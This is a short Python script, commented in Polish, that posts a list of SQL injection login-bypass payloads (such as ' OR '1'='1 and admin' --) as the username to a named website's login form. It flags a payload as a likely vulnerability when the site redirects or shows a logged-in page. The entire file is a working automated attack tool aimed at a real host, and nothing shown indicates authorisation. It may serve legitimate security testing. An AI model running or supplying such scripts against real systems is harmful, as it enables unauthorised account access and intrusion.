import requests

url = 'https://test.equinox-system.com/'

sql_payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin' --",
    "admin' #",
    "' OR 'a'='a",
]

def sql_injection(url, payload):
    data = {
        "username": payload,
        "password": "password"
    }
    try:
        response = requests.post(url, data=data)
        if response.status_code == 302 or "zalogowano" in response.text.lower() or "dashboard" in response.text.lower():
            print(f"Potencjalna podatność na ataki sql: {payload}")
        else:
            print(f"Strona odporna na ataki sql: {payload}")
    except Exception as e:
        print(f"Problem podczas testowania {payload}: {str(e)}")

if __name__ == "__main__":
    print("Testowanie podatności strony")
    for payload in sql_payloads:
        sql_injection(url, payload)
